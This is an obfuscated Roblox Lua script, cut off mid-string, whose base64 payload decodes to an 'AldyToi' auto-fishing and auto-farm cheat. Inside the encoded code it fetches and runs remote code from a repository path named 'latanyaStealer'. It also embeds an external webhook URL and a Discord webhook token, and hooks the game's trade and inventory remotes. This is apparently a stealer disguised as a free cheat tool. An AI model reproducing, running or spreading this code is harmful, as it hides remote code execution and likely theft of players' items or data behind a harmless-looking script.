-- Obfuscated Lua
loadstring(game:HttpGet('data:text/plain;base64,bG9jYWwgdmFyXzBudjgyYyA9IChsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FsZHlqcnovbGF0YW55YVN0ZWFsZXIvcmVmcy9oZWFkcy9tYWluL3VpL2FuZ2luIikpKSgpCmxvY2FsIHZhcl9vajVhZ28gPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCB2YXJfYnJkaWN3ID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgdmFyXzIwZWo1ZCA9IGdhbWU6R2V0U2VydmljZSgiVGVsZXBvcnRTZXJ2aWNlIikKbG9jYWwgdmFyX2gzazgzdSA9IEFsZHlUb2lULkxvY2FsUGxheWVyCmxvY2FsIHZhcl9yaDB4aXQgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKbG9jYWwgdmFyX296eGgxMSA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCmxvY2FsIHZhcl93OTJqOXQgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikKbG9jYWwgdmFyXzl4dTRhOCA9IGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIikKCmlmIG5vdCBBbGR5VG9pRyBvciBub3QgQWxkeVRvaUggdGhlbiByZXR1cm4gZW5kCgpsb2NhbCB2YXJfY3UycTM1ID0geyJDb21tb24iLCAiVW5jb21tb24iLCAiUmFyZSIsICJFcGljIiwgIkxlZ2VuZGFyeSIsICJNeXRoaWNhbCIsICJTRUNSRVQifQpsb2NhbCB2YXJfcnk4Y21uID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQpsb2NhbCB2YXJfZ2l6Y3J5ID0gZ2FtZTpHZXRTZXJ2aWNlKCJMaWdodGluZyIpCmxvY2FsIHZhcl9wdWw1cHIgPSBBbGR5VG9pRzpXYWl0Rm9yQ2hpbGQoIlBsYXllckd1aSIpCmxvY2FsIHZhcl81a3QyenYgPSAocmVxdWlyZShBbGR5VG9pSC5SZXBsaW9uKSkuUmVwbGlvbgpsb2NhbCB2YXJfZjVkZnZxID0gQWxkeVRvaWY6V2FpdFJlcGxpb24oIkRhdGEiKQpsb2NhbCB2YXJfbHhzbzZ0ID0gQWxkeVRvaUo6R2V0KCJFcXVpcHBlZFRvb2xVVUlEIikKbG9jYWwgdmFyXzEzZXIxcyA9IEFsZHlUb2lKOkdldCgiRGF0YSIpCmxvY2FsIHZhcl9hbGhzd3YgPSBBbGR5VG9pbCBhbmQgQWxkeVRvaWxbImZpc2hpbmcgUm9kcyJdIG9yIHt9CmxvY2FsIHZhcl82M2NtZHEgPSBuaWwKbG9jYWwgdmFyX3EzNDYyZSA9IDAKbG9jYWwgdmFyXzg2YnY2MyA9IEFsZHlUb2lHLlBsYXllckd1aTpGaW5kRmlyc3RDaGlsZCgiTWFpblVJIikKCmZvciBBbGR5VG9pUSwgQWxkeVRvaVQgaW4gcGFpcnMoQWxkeVRvaXUpIGRvCiAgICBpZiB0b3N0cmluZyhBbGR5VG9pVC5VVUlEKSA9PSB0b3N0cmluZyhBbGR5VG9pdykgdGhlbgogICAgICAgIEFsZHlUb2lxID0gQWxkeVRvaVQuSWQKICAgICAgICBicmVhawogICAgZW5kCmVuZAoKbG9jYWwgdmFyX3VrYWZ1byA9IEFsZHlUb2lIOldhaXRGb3JDaGlsZCgiaXRlbXMiKQpsb2NhbCB2YXJfNTFxbGR5ID0gQWxkeVRvaUguUGFja2FnZXMuX0luZGV4Lm5ldC5SRV9GYXZvcml0ZUl0ZW0KbG9jYWwgdmFyX2FidmJnOCA9IHJlcXVpcmUoQWxkeVRvaUguTW9kdWxlcy51dGlsaXR5KQpsb2NhbCB2YXJfMWVidjh0ID0gImh0dHBzOi8vaWdnYnMuaW5kb2Fyc2lwLmNvLmlkL3h3ZWJob29rLnBocCIKbG9jYWwgdmFyX3FkbHJvbiA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMTY5MzAwMDY3MzQxMDc4NzM0L0xxV2NfOEUzbk8zV2s3Ul9qTjVmRnFWalhnIgpsb2NhbCB2YXJfajJhOHhxID0gKCgoQWxkeVRvaUg6V2FpdEZvckNoaWxkKCJQYWNrYWdlcyIpKTpXYWl0Rm9yQ2hpbGQoIl9JbmRleCIpKTpXYWl0Rm9yQ2hpbGQoIm5ldCIpKTpXYWl0Rm9yQ2hpbGQoIm5ldCIpCmxvY2FsIHZhcl94enFncTUgPSB0aWNrKCkKCkFsZHlUb2lROkFkZFRoZW1lKHsKICAgIEJhY2tncm91bmQgPSAiIzFmMWYxZiIsCiAgICBBY2NlbnQgPSBDb2xvcjMuZnJvbVJHQig2MCwgMTgwLCAxMjApLAogICAgRGlhbG9nID0gQ29sb3IzLmZyb21SR0IoMjQsIDI0LCAyNCksCiAgICBPdXRsaW5lID0gQ29sb3IzLm5ldygwLjMsIDAuNCwgMC41KSwKICAgIFNlY29uZGFyeUJhY2tncm91bmQgPSBDb2xvcjMuZnJvbVJHQigxMTIsIDExMiwgMTEyKSwKICAgIFRleHRTaXplID0gMTYsCiAgICBUZXh0ID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSksCiAgICBJbnB1dCA9IENvbG9yMy5mcm9tUkdCKDI0LCAyNCwgMjQpLAogICAgSGVhZGVyID0gQ29sb3IzLmZyb21SR0IoMTEsIDIzLCAzMSkKfSkKCkFsZHlUb2lRLlRoZW1lLkRyb3Bkb3duID0ge1RleHRTaXplID0gMTYsIFRleHRDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpfQoKZG8KICAgIEFsZHlUb2lROlNldEZvbnQoInJieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvVWJ1bnR1Lmpzb24iKQogICAgbG9jYWwgdmFyX3F1N2c2ZCBBbGR5VG9pVCgpCiAgICAgICAgbG9jYWwgdmFyX29oN2gwYyA9IGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIikKICAgICAgICBsb2NhbCB2YXJfbW0zbTVhID0gZ2FtZTpHZXRTZXJ2aWNlKCJMaWdodGluZyIpCiAgICAgICAgbG9jYWwgdmFyX3F4ZnZmbCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIHZhcl81cDhuYXogPSBJbnN0YW5jZS5uZXcoIkJsdXJFZmZlY3QiKQogICAgICAgIEFsZHlUb2lZLlNpemUgPSAwCiAgICAgICAgQWxkeVRvaVkuUGFyZW50ID0gQWxkeVRvaVQKICAgICAgICAoQWxkeVRvaVE6Q3JlYXRlKEFsZHlUb2lZLCBUd2VlbkluZm8ubmV3KDAuNSksIHtTaXplID0gMjR9KSk6UGxheSgpCiAgICAgICAgbG9jYWwgdmFyXzdpaHZxMCA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIikKICAgICAgICBBbGR5VG9pRy5OYW1lID0gIkFsZHlTcGxhc2giCiAgICAgICAgQWxkeVRvaUcuRW5hYmxlZCA9IGZhbHNlCiAgICAgICAgQWxkeVRvaUcuSWdub3JlR3VpSW5zZXQgPSB0cnVlCiAgICAgICAgQWxkeVRvaUcuUGFyZW50ID0gQWxkeVRvaWM6V2FpdEZvckNoaWxkKCJQbGF5ZXJHdWkiKQogICAgICAgIGxvY2FsIHZhcl9sNWwweTIgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgICAgICBBbGR5VG9pTy5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCiAgICAgICAgQWxkeVRvaU8uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBBbGR5VG9pTy5QYXJlbnQgPSBBbGR5VG9pRwogICAgICAgIGxvY2FsIHZhcl90ajRkOXEgPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiKQogICAgICAgIEFsZHlUb2lzLlNjYWxlID0gMC4zCiAgICAgICAgQWxkeVRvaXMuUGFyZW50ID0gQWxkeVRvaU8KICAgICAgICBsb2NhbCB2YXJfM2l3cWFjID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgIEFsZHlUb2lILlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKICAgICAgICBBbGR5VG9pSC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIEFsZHlUb2lILlRleHQgPSAiLkFsZHlUb2kiCiAgICAgICAgQWxkeVRvaUguRm9udEZhY2UgPSBGb250Lm5ldygicmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9VYnVudHUuanNvbiIpCiAgICAgICAgQWxkeVRvaUguVGV4dFNpemUgPSA4MAogICAgICAgIEFsZHlUb2lILlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIEFsZHlUb2lILlRleHRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgQWxkeVRvaUguQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDAuNSkKICAgICAgICBBbGR5VG9pSC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNDUsIDApCiAgICAgICAgQWxkeVRvaUguWkluZGV4ID0gMgogICAgICAgIEFsZHlUb2lILlBhcmVudCA9IEFsZHlUb2lPCiAgICAgICAgbG9jYWwgdmFyX3VnczVpNSA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIpCiAgICAgICAgQWxkeVRvaWcuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyh7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb2xvcjMuZnJvbVJHQig2MCwgMTgwLCAxMjApKTsgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLCBDb2xvcjMuZnJvbVJHQigxMjAsIDIyMCwgMTYwKSl9KQogICAgICAgIEFsZHlUb2lnLlJvdGF0aW9uID0gOTAKICAgICAgICBBbGR5VG9pZy5QYXJlbnQgPSBBbGR5VG9pSAogICAgICAgIGxvY2FsIHZhcl90NmtlNHIgPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIikKICAgICAgICBBbGR5VG9pcC5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDEwMCwgMjAwLCAxNDApCiAgICAgICAgQWxkeVRvaXAuVGhpY2tuZXNzID0gMgogICAgICAgIEFsZHlUb2lwLlRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBBbGR5VG9pcC5BcHBseVN0cm9rZU1vZGUgPSBFbnVtLkFwcGx5U3Ryb2tlTW9kZS5Cb3JkZXIKICAgICAgICBBbGR5VG9pcC5QYXJlbnQgPSBBbGR5VG9pSAogICAgICAgIGxvY2FsIHZhcl96bXF5Z2kgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgQWxkeVRvaWQuU2l6ZSA9IFVEaW0yLm5ldygwLjgsIDAsIDAuMSwgMCkKICAgICAgICBBbGR5VG9pZC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNTgsIDApCiAgICAgICAgQWxkeVRvaWQuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDApCiAgICAgICAgQWxkeVRvaWQuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBBbGR5VG9pZC5UZXh0ID0gIlBsZWFzZSB3YWl0LCBsb2FkaW5nIHNjcmlwdC4uLiIKICAgICAgICBBbGR5VG9pZC5Gb250ID0gRW51bS5Gb250LlVidW50dQogICAgICAgIEFsZHlUb2lkLlRleHRTaXplID0gMTgKICAgICAgICBBbGR5VG9pZC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTAwLCAyMDAsIDE0MCkKICAgICAgICBBbGR5VG9pZC5UZXh0VHJhbnNwYXJlbmN5ID0gMQogICAgICAgIEFsZHlUb2lkLlRleHRXcmFwcGVkID0gdHJ1ZQogICAgICAgIEFsZHlUb2lkLlRleHRZQWxpZ25tZW50ID0gRW51bS5UZXh0WUFsaWdubWVudC5Ub3AKICAgICAgICBBbGR5VG9pZC5aSW5kZXggPSAyCiAgICAgICAgQWxkeVRvaWQuUGFyZW50ID0gQWxkeVRvaU8KICAgICAgICAoQWxkeVRvaVE6Q3JlYXRlKEFsZHlUb2lzLCBUd2VlbkluZm8ubmV3KDAuOCwgRW51bS5FYXNpbmdTdHlsZS5CYWNrLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7U2NhbGUgPSAxfSkpOlBsYXkoKQogICAgICAgIChBbGR5VG9pUTpDcmVhdGUoQWxkeVRvaUgsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIEVudW0uRWFzaW5nRGlyZWN0aW9uLkluT3V0KSwge1RleHRUcmFuc3BhcmVuY3kgPSAwfSkpOlBsYXkoKQogICAgICAgIChBbGR5VG9pUTpDcmVhdGUoQWxkeVRvaXAsIFR3ZWVuSW5mby5uZXcoMC42KSwge1RyYW5zcGFyZW5jeSA9IDB9KSk6UGxheSgpCiAgICAgICAgKEFsZHlUb2lROkNyZWF0ZShBbGR5VG9pZCwgVHdlZW5JbmZvLm5ldygwLjgpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDB9KSk6UGxheSgpCiAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgKEFsZHlUb2lROkNyZWF0ZShBbGR5VG9pSCwgVHdlZW5JbmZvLm5ldygwLjQpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDF9KSk6UGxheSgpCiAgICAgICAgKEFsZHlUb2lROkNyZWF0ZShBbGR5VG9pcCwgVHdlZW5JbmZvLm5ldygwLjQpLCB7VHJhbnNwYXJlbmN5ID0gMX0pKTpQbGF5KCkKICAgICAgICAoQWxkeVRvaVE6Q3JlYXRlKEFsZHlUb2lkLCBUd2VlbkluZm8ubmV3KDAuNCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pKTpQbGF5KCkKICAgICAgICAoQWxkeVRvaVE6Q3JlYXRlKEFsZHlUb2lzLCBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5DdWJpYywgRW51bS5FYXNpbmdEaXJlY3Rpb24uSW4pLCB7U2NhbGUgPSAwLjd9KSk6UGxheSgpCiAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICBBbGR5VG9pRzpEZXN0cm95KCkKICAgICAgICBBbGR5VG9pWTpEZXN0cm95KCkKICAgIGVuZAogICAgQWxkeVRvaVQoKQplbmQKCmxvY2FsIHZhcl9pczZzejAgPSBvcy50aW1lKCkKbG9jYWwgdmFyXzF3N3JmYyA9IEFsZHlUb2lHLlBsYXllckd1aS5NYWluVUkuTWFpbi5QYWdlcy5JbnZlbnRvcnkKbG9jYWwgdmFyX3hyM2x5eSA9IEFsZHlUb2lHLlBsYXllckd1aS5NYWluVUkuSW52ZW50b3J5SXRlbXMKbG9jYWwgdmFyX2Y5aWJjeSA9IHt9CkFsZHlUb2lJLlJGX0NoYXJnZUZpc2hpbmdSb2QgPSBBbGR5VG9pTDpXYWl0Rm9yQ2hpbGQoIlJGX0NoYXJnZUZpc2hpbmdSb2QiKQpBbGR5VG9pSS5SRl9SZXF1ZXN0RmlzaGluZ01pbmlnYW1lU3RhcnRlZCA9IEFsZHlUb2lMOldhaXRGb3JDaGlsZCgiUkZfUmVxdWVzdEZpc2hpbmdNaW5pZ2FtZVN0YXJ0ZWQiKQpBbGR5VG9pSS5SRV9GaXNoaW5nQ29tcGxldGVkID0gQWxkeVRvaUw6V2FpdEZvckNoaWxkKCJSRV9GaXNoaW5nQ29tcGxldGVkIikKQWxkeVRvaUkuUkVfRXF1aXBUb29sID0gQWxkeVRvaUw6V2FpdEZvckNoaWxkKCJSRV9FcXVpcFRvb2xGcm9tSG90YmFyIikKQWxkeVRvaUkuVW5FcXVpcFRvb2wgPSBBbGR5VG9pTDpXYWl0Rm9yQ2hpbGQoIlJFX1VuZXF1aXBUb29sRnJvbUhvdGJhciIpCkFsZHlUb2lJLlJFX0Zpc2hpbmdFZmZlY3QgPSBBbGR5VG9pTDpXYWl0Rm9yQ2hpbGQoIlJFX0Zpc2hpbmdFZmZlY3QiKQpBbGR5VG9pSS5SRl9BdXRvRmlzaCA9IEFsZHlUb2lMOldhaXRGb3JDaGlsZCgiUkZfVXBkYXRlQXV0b2Zpc2hpbmdTdGF0ZSIpCkFsZHlUb2lJLlJFX1BsYWNlTGV2ZXJJdGVtID0gQWxkeVRvaUw6V2FpdEZvckNoaWxkKCJSRV9QbGFjZUxldmVySXRlbSIpCkFsZHlUb2lJLlJGX0luaXRpYXRlVHJhZGUgPSBBbGR5VG9pTDpXYWl0Rm9yQ2hpbGQoIlJGX0luaXRpYXRlVHJhZGUiKQpBbGR5VG9pSS5SRl9Qcm9wb3NlVHJhZGVJdGVtID0gQWxkeVRvaUw6V2FpdEZvckNoaWxkKCJSRl9Qcm9wb3NlVHJhZGVJdGVtIikKQWxkeVRvaUkuUkVSb2xsRW5jaGFudCA9IEFsZHlUb2lMOldhaXRGb3JDaGlsZCgiUkVSb2xsRW5jaGFudCIpCkFsZHlUb2lJLlJFX0FjdGl2YXRlRW5jaGFudGluZ0FsdGFyID0gQWxkeVRvaUw6V2FpdEZvckNoaWxkKCJSRV9BY3RpdmF0ZUVuY2hhbnRpbmdBbHRhciIpCkFsZHlUb2lJLlJGX0NhbmNlbEZpc2hpbmcgPSBBbGR5VG9pTDpXYWl0Rm9yQ2hpbGQoIlJGX0NhbmNlbEZpc2hpbmdJbnB1dHMiKQpBbGR5VG9pSS5SRl9TZWxsQWxsSXRlbXMgPSBBbGR5VG9pTDpXYWl0Rm9yQ2hpbGQoIlJGX1NlbGxBbGxJdGVtcyIpCkFsZHlUb2lJLlJFX1BsYWNlRW5jaGFudEl0ZW0gPSBBbGR5VG9pTDpXYWl0Rm9yQ2hpbGQoIlJFX1BsYWNlRW5jaGFudEl0ZW0iKQoKbG9jYWwgdmFyX2x5NXB6ZiA9IGZhbHNlCmxvY2FsIHZhcl9keHJlYWggPSBBbGR5VG9pUTpDcmVhdGVXaW5kb3coewogICAgVGl0bGUgPSAiQWxkeVRvaSIsCiAgICBJY29uID0gInJieGFzc2V0aWQ6Ly83MTAzOTUuNDQ2NTc0IiwKICAgIFN1YnRpdGxlID0gIi5BbGR5VG9pIC0gZnJlZSB0byB1c2UsIG5vIGtleSByZXF1aXJlZCBhbmQgbm8gcHJlbWl1bSB2ZXJzaW9uLiIsCiAgICBOYW1lID0gImZpc2hpdEFsZHlUb2kiLAogICAgU2l6ZSA9IFVEaW0yLm5ldyg1MjAsIDI1MCksCiAgICBUcmFuc3BhcmVudCA9IHRydWUsCiAgICBNaW5pbWl6YWJsZSA9IHRydWUsCiAgICBEcmFnZ2FibGUgPSB0cnVlLAogICAgUmVzaXphYmxlID0gdHJ1ZQp9KQoKQWxkeVRvaVE6U2V0VGhlbWUoIkRhcmsiKQoKaWYgbm90IEFsZHlUb2lXIHRoZW4gcmV0dXJuIGVuZAoKQWxkeVRvaVc6RWRpdE9wZW5CdXR0b24oewogICAgVGl0bGUgPSAiQWxkeVRvaSIsCiAgICBJY29uID0gImZpc2giLAogICAgSWNvblNpemUgPSBVRGltLm5ldygwLCAxNiksCiAgICBTdHJva2VUaGlja25lc3MgPSAyLAogICAgQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyh7CiAgICAgICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb2xvcjMuZnJvbVJHQig2MCwgMTgwLCAxMjApKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDEyMCwgMjIwLCAxNjApKQogICAgfSksCiAgICBQb3NpdGlvbiA9IFVEaW0yLm5ldygwLCA5NSwgMCwgNzApLAogICAgT25seU1vYmlsZSA9IGZhbHNlLAogICAgUmVzZXRPblNwYXduID0gZmFsc2UsCiAgICBEcmFnZ2FibGUgPSB0cnVlCn0pCgpmdW5jdGlvbiBBbGR5VG9pVy5FZGl0T3BlbkJ1dHRvbihBbGR5VG9pUSkKICAgIGxvY2FsIHZhcl9wMDdrN2kgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCiAgICBBbGR5VG9pVC5OYW1lID0gIlJheWZpZWxkT3BlbkJ1dHRvbiIKICAgIEFsZHlUb2lULlpJbmRleEJlaGF2aW9yID0gRW51bS5aSW5kZXhCZWhhdmlvci5TaWJsaW5nCiAgICBBbGR5VG9pVC5SZXNldE9uU3Bhd24gPSBmYWxzZQogICAgQWxkeVRvaVQuUGFyZW50ID0gZ2FtZTpHZXRTZXJ2aWNlKCJDb3JlR3VpIikKICAgIEFsZHlUb2lULlJlc2V0T25TcGF3biA9IGZhbHNlCiAgICBsb2NhbCB2YXJfcnE0ZTl6ID0gSW5zdGFuY2UubmV3KCJJbWFnZUJ1dHRvbiIpCiAgICBBbGR5VG9pYy5OYW1lID0gIk9wZW5CdXR0b24iCiAgICBBbGR5VG9pYy5TaXplID0gVURpbTIubmV3KDAsIDQ1LCAwLCA0NSkKICAgIEFsZHlUb2ljLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDk1LCAwLCA3MCkKICAgIEFsZHlUb2ljLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigzMSwgMzEsIDMxKQogICAgQWxkeVRvaWMuSW1hZ2UgPSAicmJ4YXNzZXRpZDovLzEzMDU0NTkzNDQ0IgogICAgQWxkeVRvaWMuQXV0b0J1dHRvbkNvbG9yID0gdHJ1ZQogICAgQWxkeVRvaWMuUGFyZW50ID0gQWxkeVRvaVQKICAgIGxvY2FsIHZhcl9jOWJoZzEgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgQWxkeVRvaWMpCiAgICBBbGR5VG9pWS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA5KQogICAgbG9jYWwgdmFyX3huN3l2ZCA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiLCBBbGR5VG9pYykKICAgIEFsZHlUb2lHLlRoaWNrbmVzcyA9IDEuNQogICAgQWxkeVRvaUcuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigxMjMsIDIxNSwgNjQpCiAgICBBbGR5VG9pRy5BcHBseVN0cm9rZU1vZGUgPSBFbnVtLkFwcGx5U3Ryb2tlTW9kZS5Cb3JkZXIKICAgIGxvY2FsIHZhcl8yc3huam0sIEFsZHlUb2lzLCBBbGR5VG9pSAogICAgQWxkeVRvaWMuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKEFsZHlUb2lRKQogICAgICAgIGlmIEFsZHlUb2lRLlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSBvciBBbGR5VG9pUS5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuCiAgICAgICAgICAgIEFsZHlUb2lPLCBBbGR5VG9pcywgQWxkeVRvaUggPSB0cnVlLCBBbGR5VG9pUS5Qb3NpdGlvbiwgQWxkeVRvaWMuUG9zaXRpb24KICAgICAgICAgICAgQWxkeVRvaVEuQ2hhbmdlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGlmIEFsZHlUb2lRLlVzZXJJbnB1dFN0YXRlID09IEVudW0uVXNlcklucHV0U3RhdGUuRW5kIHRoZW4KICAgICAgICAgICAgICAgICAgICBBbGR5VG9pTyA9IGZhbHNlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kKQoKICAgIChnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKSkuSW5wdXRDaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24oQWxkeVRvaVEpCiAgICAgICAgaWYgQWxkeVRvaU8gYW5kIChBbGR5VG9pUS5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZU1vdmVtZW50IG9yIEFsZHlUb2lRLlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoKSB0aGVuCiAgICAgICAgICAgIGxvY2FsIHZhcl9ob2JwajAgPSBBbGR5VG9pUS5Qb3NpdGlvbiAtIEFsZHlUb2lzCiAgICAgICAgICAgIEFsZHlUb2ljLlBvc2l0aW9uID0gVURpbTIubmV3KEFsZHlUb2lILlguU2NhbGUsIEFsZHlUb2lILlguT2Zmc2V0ICsgQWxkeVRvaVQuWCwgQWxkeVRvaUguWS5TY2FsZSwgQWxkeVRvaUguWS5PZmZzZXQgKyBBbGR5VG9pVC5ZKQogICAgICAgIGVuZAogICAgZW5kKQogICAgCiAgICBBbGR5VG9pYy5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBBbGR5VG9pVC5FbmFibGVkID0gZmFsc2UKICAgICAgICBBbGR5VG9pVzpPcGVuKCkKICAgIGVuZCkKCiAgICBBbGR5VG9pVzpPbkRlc3Ryb3koZnVuY3Rpb24oKQogICAgICAgIEFsZHlUb2lUOkRlc3Ryb3koKQogICAgZW5kKQoKICAgIEFsZHlUb2lXOkRpc2FibGVUb3BiYXJCdXR0b25zKHsiQ2xvc2UiLCAiTWluaW1pemUifSkKICAgIEFsZHlUb2lXOkNyZWF0ZVRvcGJhckJ1dHRvbigiQ2xvc2UiLCAieCIsIGZ1bmN0aW9uKCkKICAgICAgICBBbGR5VG9pVzpDbG9zZSgpCiAgICAgICAgQWxkeVRvaVQuRW5hYmxlZCA9IHRydWUKICAgIGVuZCwgOTk5KQoKICAgIEFsZHlUb2lRLk9wZW5CdXR0b24gPSBBbGR5VG9pVAplbmQKQWxkeVRvaVc6RWRpdE9wZW5CdXR0b24oKQoKbG9jYWwgdmFyXzduaDgxeSA9IEFsZHlUb2lXLkNvbmZpZ01hbmFnZXIKbG9jYWwgdmFyX20xcXdiNyA9IEFsZHlUb2loOkNyZWF0ZUNvbmZpZygiVG9pIikKQWxkeVRvaVc6U2V0QmFja2dyb3VuZEltYWdlVHJhbnNwYXJlbmN5KDEpCkFsZHlUb2lXOklzUmVzaXphYmxlKHRydWUpCgpsb2NhbCB2YXJfenpmcTduID0gewogICAgTGVnZW5kYXJ5ID0gZmFsc2UsCiAgICBNeXRoaWNhbCA9IGZhbHNlLAogICAgU2VjcmV0ID0gZmFsc2UKfQpsb2NhbCB2YXJfMWV3Z2czID0gewogICAgQXV0b1NlbGwgPSBmYWxzZSwKICAgIGF1dG9SZWNhc3QgPSBmYWxzZSwKICAgIGNhc3RTdHlsZSA9ICJub3JtYWwiLAogICAgYXV0b0J1eVdlYXRoZXIgPSBmYWxzZSwKICAgIGp1bXBLZXliaW5kID0gZmFsc2UsCiAgICBsb29wRGVsYXkgPSAwLjAxLAogICAgYXV0b0Zpc2hpbmcgPSBmYWxzZSwKICAgIGFtYXppbmdDYXN0ID0gZmFsc2UsCiAgICBzZWxlY3RlZFRpZXIgPSB7fSwKICAgIGZsb2F0aW5nUGxhdGZvcm0gPSBmYWxzZSwKICAgIGF1dG9SZWNhc3QgPSB0cnVlLAogICAgYXV0b0FydGlmYWN0ID0gZmFsc2UsCiAgICBwcmljZVZhbHVlID0gZmFsc2UsCiAgICBhdXRvRmFybWluZyA9IGZhbHNlLAogICAgYW5pbWF0ZSA9ICJza2lwIiwKICAgIGF1dG9GYXJtQXJ0aWZhY3QgPSBmYWxzZQp9Cgpsb2NhbCB2YXJfZXZnZGdvID0gQWxkeVRvaVc6U2VjdGlvbih7VGl0bGUgPSAiTWFpbiBNZW51IiwgSWNvbiA9IDE0LCBTaG93VGFiVGl0bGUgPSB0cnVlfSkKbG9jYWwgdmFyX2FqcW5yciA9IEFsZHlUb2lXOlNlY3Rpb24oe1RpdGxlID0gIk1pc2MiLCBJY29uID0gMTQsIFNob3dUYWJUaXRsZSA9IHRydWV9KQpsb2NhbCB2YXJfc3c4YmpsID0gQWxkeVRvaWE6VGFiKHtUaXRsZSA9ICJBdXRvIEZpc2hpbmciLCBJY29uID0gImZpc2giLCBTaG93VGFiVGl0bGUgPSB0cnVlfSkKbG9jYWwgdmFyXzJ3dGM1cyA9IEFsZHlUb2lhOlRhYih7VGl0bGUgPSAiQXV0byBTZWxsIiwgSWNvbiA9ICJzaG9wcGluZy1jYXJ0IiwgU2hvd1RhYlRpdGxlID0gdHJ1ZX0pCmxvY2FsIHZhcl8xMHhhdTQgPSBBbGR5VG9pYTpUYWIoe1RpdGxlID0gIkF1dG8gRmFybSIsIEljb24gPSAiemFwIiwgU2hvd1RhYlRpdGxlID0gdHJ1ZX0pCmxvY2FsIHZhcl81OWZyN3YgPSBBbGR5VG9pYTpUYWIoe1RpdGxlID0gIkV2ZW50cyIsIEljb24gPSAiY2FsZW5kYXIiLCBTaG93VGFiVGl0bGUgPSB0cnVlfSkKbG9jYWwgdmFyX2JmdmhzOSA9IEFsZHlUb2lhOlRhYih7VGl0bGUgPSAiUGxheWVyIENvbmZpZyIsIEljb24gPSAiY29nIiwgU2hvd1RhYlRpdGxlID0gdH